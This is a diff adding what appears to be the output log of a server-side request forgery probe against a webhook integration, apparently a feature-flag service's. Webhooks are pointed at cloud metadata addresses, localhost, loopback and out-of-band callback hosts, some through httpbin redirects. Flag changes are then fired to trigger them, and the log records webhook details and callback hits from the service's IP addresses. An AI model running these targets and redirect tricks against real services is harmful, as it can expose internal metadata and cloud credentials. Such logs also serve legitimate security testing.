@@ -1,0 +1,81 @@
+[W3c-localhost80] 201 created 6ada8af57d401b07a4974fe9
+[W3d-loopback] 201 created 6ada8af6176322076b994833
+[W3e-metadata-root] 201 created 6ada8af750300b07828f8f45
+[W3f-mdgoog] 201 created 6ada8af8022a1f07bba95106
+[W3g-mdginternal] 201 created 6ada8afa65fd9b07cf897c44
+[W3h-v6metadata] 201 created 6ada8afb13dfe507423b24c5
+
+### all webhooks now:
+  6ada0e0ff68b4507c663d7d5  https://webhook.site/4bd4bb0f-fb6f-4fe9-82bc-9146ebabb584
+  6ada601db9a33f075201c887  https://d9c558sobm9hlgrrkssg17bwia6p4dicf.oast.site/ld-webhook-probe
+  6ada6031de91770792196bf0  https://internal-probe-xyz.invalid-host-d9c558sobm9hlgrrkssg17bwia6p4dicf.oast.site/hook
+  6ada8abf40a7b8072deeefa8  https://0xfvy9xf0l070a369a4ln51he8uvdev0h.oast.me/wh-direct
+  6ada8ac050300b07828f8ee2  http://169.254.169.254/latest/meta-data/
+  6ada8ac28f049f07376083bf  https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?src=ld-webhook
+  6ada8ac38d015c070cdc3f42  https://httpbin.org/redirect-to?url=https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?via=redirect&status_code=302
+  6ada8ac4de917707921ac6bc  https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&status_code=302
+  6ada8af57d401b07a4974fe9  http://localhost/
+  6ada8af6176322076b994833  http://127.0.0.1/
+  6ada8af750300b07828f8f45  http://169.254.169.254/
+  6ada8af8022a1f07bba95106  http://metadata.goog/
+  6ada8afa65fd9b07cf897c44  http://metadata.google.internal/
+  6ada8afb13dfe507423b24c5  http://[fd00:ec2::254]/
+
+### firing flag change (2x with new value each time)
+  fire 0: 200
+  fire 1: 200
+
+### waiting 45s for deliveries/retries...
+
+### webhook detail fields (looking for delivery status/error leakage)
+  6ada0e0ff68b4507c663d7d5 https://webhook.site/4bd4bb0f-fb6f-4fe9-82bc-9146ebabb584
+      extra: {"_access": {"denied": [], "allowed": []}}
+  6ada601db9a33f075201c887 https://d9c558sobm9hlgrrkssg17bwia6p4dicf.oast.site/ld-webhook-probe
+      extra: {"_access": {"denied": [], "allowed": []}}
+  6ada6031de91770792196bf0 https://internal-probe-xyz.invalid-host-d9c558sobm9hlgrrkssg17bwia6p4dicf.oast.site/hook
+      extra: {"_access": {"denied": [], "allowed": []}}
+  6ada8abf40a7b8072deeefa8 https://0xfvy9xf0l070a369a4ln51he8uvdev0h.oast.me/wh-direct
+      extra: {"_access": {"denied": [], "allowed": []}}
+  6ada8ac050300b07828f8ee2 http://169.254.169.254/latest/meta-data/
+      extra: {"_access": {"denied": [], "allowed": []}}
+  6ada8ac28f049f07376083bf https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?src=ld-webhook
+      extra: {"_access": {"denied": [], "allowed": []}}
+  6ada8ac38d015c070cdc3f42 https://httpbin.org/redirect-to?url=https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?via=redirect&status_code=302
+      extra: {"_access": {"denied": [], "allowed": []}}
+  6ada8ac4de917707921ac6bc https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&status_code=302
+      extra: {"_access": {"denied": [], "allowed": []}}
+  6ada8af57d401b07a4974fe9 http://localhost/
+      extra: {"_access": {"denied": [], "allowed": []}}
+  6ada8af6176322076b994833 http://127.0.0.1/
+      extra: {"_access": {"denied": [], "allowed": []}}
+  6ada8af750300b07828f8f45 http://169.254.169.254/
+      extra: {"_access": {"denied": [], "allowed": []}}
+  6ada8af8022a1f07bba95106 http://metadata.goog/
+      extra: {"_access": {"denied": [], "allowed": []}}
+  6ada8afa65fd9b07cf897c44 http://metadata.google.internal/
+      extra: {"_access": {"denied": [], "allowed": []}}
+  6ada8afb13dfe507423b24c5 http://[fd00:ec2::254]/
+      extra: {"_access": {"denied": [], "allowed": []}}
+
+### webhook.site hits
+  total hits: 21
+  - 2026-10-22 22:15:30 GET https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?via=redirect ip=54.144.218.89
+      hdr: {"user-agent": ["LD-Integrations/1.0"], "host": ["webhook.site"]}
+  - 2026-10-22 22:15:30 POST https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?src=ld-webhook ip=54.221.221.197
+      hdr: {"user-agent": ["LD-Integrations/1.0"], "host": ["webhook.site"]}
+  - 2026-10-22 22:15:26 GET https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?via=redirect ip=34.236.6.43
+      hdr: {"user-agent": ["LD-Integrations/1.0"], "host": ["webhook.site"]}
+  - 2026-10-22 22:15:26 POST https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?src=ld-webhook ip=54.221.221.197
+      hdr: {"user-agent": ["LD-Integrations/1.0"], "host": ["webhook.site"]}
+  - 2026-10-22 22:15:23 GET https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?via=redirect ip=34.236.6.43
+      hdr: {"user-agent": ["LD-Integrations/1.0"], "host": ["webhook.site"]}
+  - 2026-10-22 22:15:23 POST https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?src=ld-webhook ip=54.144.218.89
+      hdr: {"user-agent": ["LD-Integrations/1.0"], "host": ["webhook.site"]}
+  - 2026-10-22 22:15:22 GET https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?via=redirect ip=54.144.218.89
+      hdr: {"user-agent": ["LD-Integrations/1.0"], "host": ["webhook.site"]}
+  - 2026-10-22 22:15:22 POST https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?src=ld-webhook ip=54.144.218.89
+      hdr: {"user-agent": ["LD-Integrations/1.0"], "host": ["webhook.site"]}
+  - 2026-10-22 22:15:21 GET https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?via=redirect ip=54.221.221.197
+      hdr: {"user-agent": ["LD-Integrations/1.0"], "host": ["webhook.site"]}
+  - 2026-10-22 22:15:21 POST https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?src=ld-webhook ip=34.236.6.43
+      hdr: {"user-agent": ["LD-Integrations/1.0"], "host": ["webhook.site"]}
